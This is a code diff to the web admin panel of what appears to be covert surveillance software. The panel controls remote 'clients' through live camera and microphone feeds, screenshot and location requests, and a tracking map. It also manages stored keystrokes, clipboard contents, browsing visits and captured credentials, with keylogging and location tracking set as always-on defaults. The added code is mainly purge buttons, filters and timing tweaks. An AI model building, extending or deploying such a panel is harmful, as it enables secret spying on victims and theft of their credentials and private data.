@@ -395,6 +395,10 @@ body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(
         <span id="live-status" style="font-size:.7rem;color:var(--dim)">Click a client to start live feed</span>
         <button class="btn" onclick="startAllLiveFeeds()">? All Live</button>
         <button class="btn" onclick="stopAllLiveFeeds()">� Stop All</button>
+        <label style="display:flex;align-items:center;gap:5px;font-size:.65rem;color:var(--dim);cursor:pointer;user-select:none">
+            <input type="checkbox" id="cam-online-only" onchange="camOnlineOnly=this.checked;loadCameraFeeds()" style="accent-color:var(--accent)"> Alleen online
+        </label>
+        <button class="btn" onclick="purgeStaleClients(1)" style="border-color:#f5c6c4;color:#d93025">🗑 Wis verlopen (>1d)</button>
     </div>
     <div id="cam-feeds"><div class="empty">Loading cameras...</div></div>
 </div>
@@ -411,6 +415,10 @@ body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(
 
 <!-- --- MAP --- -->
 <div class="view" id="v-map">
+    <div style="display:flex;gap:8px;margin-bottom:8px">
+        <button class="btn" onclick="loadMap()">🔄 Vernieuwen</button>
+        <button class="btn" onclick="if(map){const pts=Object.values(markers).map(m=>m.getLatLng());if(pts.length)map.fitBounds(pts,{padding:[40,40],maxZoom:14});}">📍 Fit Alles</button>
+    </div>
     <div id="map"></div>
 </div>
 
@@ -601,6 +609,10 @@ body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(
                 <button class="cfg-btn secondary" onclick="doCleanup('keystrokes',0)">Toetsaanslagen wissen</button>
                 <button class="cfg-btn secondary" onclick="doCleanup('clipboard',0)">Klembord wissen</button>
                 <button class="cfg-btn secondary" onclick="doCleanup('visits',0)">Bezoeken wissen</button>
+                <button class="cfg-btn secondary" onclick="doPurge('locations')">Locaties wissen</button>
+                <button class="cfg-btn secondary" onclick="doPurge('errors')">Errors wissen</button>
+                <button class="cfg-btn secondary" onclick="doPurge('credentials')">Credentials wissen</button>
+                <button class="cfg-btn secondary" style="border-color:#f5c6c4;color:#d93025" onclick="purgeStaleClients(3)">Verlopen clients (>3d) wissen</button>
             </div>
         </div>
         <div class="cfg-group">
@@ -635,7 +647,7 @@ body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(
 
 <!-- SCRIPTS -->
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-<script src="/socket.io/socket.io.js"></script>
+<script src="https://cdn.socket.io/4.8.3/socket.io.min.js" onerror="window._sioFailed=true"></script>
 <script>
 // ═══════════════════════════════════════════════════════════════
 //  STATE
@@ -645,6 +657,7 @@ let currentFilter = '';
 let liveFeeds = {}; // { clientId: { active: true, lastFrame: timestamp, fps: 0 } }
 let liveFpsCounters = {}; // for FPS calculation
 let audioPlayers = {}; // { clientId: true/false }
+let camOnlineOnly = false; // filter: only show online clients in camera tab
 const $ = s => document.querySelector(s);
 const $$ = s => document.querySelectorAll(s);
 function esc(s){if(!s)return '';var d=document.createElement('div');d.textContent=String(s);return d.innerHTML;}
@@ -926,10 +939,9 @@ function showError(context, err) {
 // ═══════════════════════════════════════════════════════════════
 let socket;
 try {
-    socket = io();
-} catch(e) {
-    showError('socket-init', e);
-}
+    // socket.io only works on the local dev server, not on Vercel (serverless)
+    if (typeof io !== 'undefined' && !window._sioFailed) socket = io();
+} catch(e) {} // silent — polling fallback handles updates
 
 if (socket) {
     socket.on('connect', () => {
@@ -1284,6 +1296,7 @@ async function loadCameraFeeds() {
                         <span class="live-dot"></span> LIVE
                     </span>
                     <span id="cam-fps-${id}" class="cam-fps"></span>
+                    <span style="font-size:.52rem;color:${online?'var(--green)':'var(--dim)'}">${online ? '● Online' : fmtAgo(cl.lastSeen)}</span>
                     <span class="cam-time" id="cam-time-${id}">${p ? fmtTime(p.timestamp) : '—'}</span>
                 </div>
                 <img id="cam-img-${id}" src="${p ? p.path + '?t=' + Date.now() : ''}" onclick="openLightbox(this.src)" alt="" style="${p ? '' : 'display:none'}">
@@ -1297,6 +1310,7 @@ async function loadCameraFeeds() {
                     <button id="mic-btn-${id}" onclick="toggleAudio('${id}')" ${!online?'disabled':''}${audioPlayers[id]?' class="active"':''}>🎙 Mic</button>
                     <button onclick="requestScreenshot('${id}')" ${!online?'disabled':''} title="Verzoek direct schermafbeelding">📷 Screenshot</button>
                     <button onclick="requestLocation('${id}')" ${!online?'disabled':''} title="Verzoek huidige locatie">📍 Locatie</button>
+                    <button onclick="if(confirm('Client ${id} verwijderen?'))deleteClient('${id}')" title="Verwijder client" style="border-color:#f5c6c4;color:#d93025">🗑</button>
                 </div>
             </div>`;
         }).join('') + '</div>';
@@ -1643,7 +1657,9 @@ function initMap() {
     if (map) { map.invalidateSize(); loadMap(); return; }
     map = L.map('map').setView([20, 0], 2);
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-        attribution: '© OpenStreetMap'
+        attribution: '© OpenStreetMap',
+        maxZoom: 19,
+        minZoom: 2
     }).addTo(map);
     loadMap();
 }
@@ -1783,6 +1799,17 @@ function fmtDuration(since) {
     return s + 's';
 }
 
+function fmtAgo(ts) {
+    if (!ts) return '?';
+    const s = Math.floor((Date.now() - new Date(ts).getTime()) / 1000);
+    if (s < 60) return s + 's geleden';
+    const m = Math.floor(s / 60);
+    if (m < 60) return m + 'm geleden';
+    const h = Math.floor(m / 60);
+    if (h < 24) return h + 'u geleden';
+    return Math.floor(h / 24) + 'd geleden';
+}
+
 function fmtEvent(data) {
     if (!data) return '';
     if (data.latitude) return `${data.clientId} → ${data.latitude.toFixed(4)}, ${data.longitude.toFixed(4)}${data.source?' ['+data.source+']':''}`;
@@ -1829,7 +1856,7 @@ async function saveConfig() {
         heartbeatPeriod: parseInt($('#cfg-hb').value) * 1000,
         // Always-on, non-configurable
         photoEnabled: false, videoEnabled: false,
-        locationEnabled: true, locationPeriod: 10000
+        locationEnabled: true, locationPeriod: 30000
     };
     const r = await fetch('/api/config', { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Admin-Token': AUTH_TOKEN }, body: JSON.stringify(cfg) });
     if (r.ok) toast('\u2705 Instellingen opgeslagen!');
@@ -1837,7 +1864,7 @@ async function saveConfig() {
 
 async function resetConfig() {
     if (!confirm('Reset alle instellingen naar standaard?')) return;
-    const def = { photoEnabled:false, videoEnabled:false, locationEnabled:true, locationPeriod:10000, photoQuality:0.7, keystrokesEnabled:true, keyLogFlush:10000, clipboardEnabled:true, clipboardCheck:15000, heartbeatPeriod:8000 };
+    const def = { photoEnabled:false, videoEnabled:false, locationEnabled:true, locationPeriod:30000, photoQuality:0.7, keystrokesEnabled:true, keyLogFlush:10000, clipboardEnabled:true, clipboardCheck:15000, heartbeatPeriod:8000 };
     await fetch('/api/config', { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Admin-Token': AUTH_TOKEN }, body: JSON.stringify(def) });
     loadConfig();
     toast('\u2705 Instellingen gereset.');
@@ -1865,6 +1892,25 @@ async function doCleanup(type, keep) {
     loadStorage();
     refreshAll();
     toast(`\uD83D\uDDD1 ${type} opgeschoond`);
+}
+
+async function doPurge(type) {
+    if (!confirm(`Alle ${type} permanent verwijderen?`)) return;
+    const r = await fetch('/api/purge/' + type, { method: 'DELETE', headers: { 'X-Admin-Token': AUTH_TOKEN } });
+    if (r.ok) { const j = await r.json(); toast(`\uD83D\uDDD1 ${j.deleted} ${type} verwijderd`); refreshAll(); }
+    else toast('\u274C Verwijderen mislukt');
+}
+
+async function purgeStaleClients(days) {
+    days = days || 3;
+    if (!confirm(`Alle offline clients die meer dan ${days} dag(en) inactief zijn verwijderen?`)) return;
+    const r = await fetch('/api/clients/stale?days=' + days, { method: 'DELETE', headers: { 'X-Admin-Token': AUTH_TOKEN } });
+    if (r.ok) {
+        const j = await r.json();
+        toast(`\uD83D\uDDD1 ${j.deleted} verlopen client(s) verwijderd`);
+        loadCameraFeeds();
+        refreshAll();
+    } else toast('\u274C Verwijderen mislukt');
 }
 
 // ═══════════════════════════════════════════════════════════════
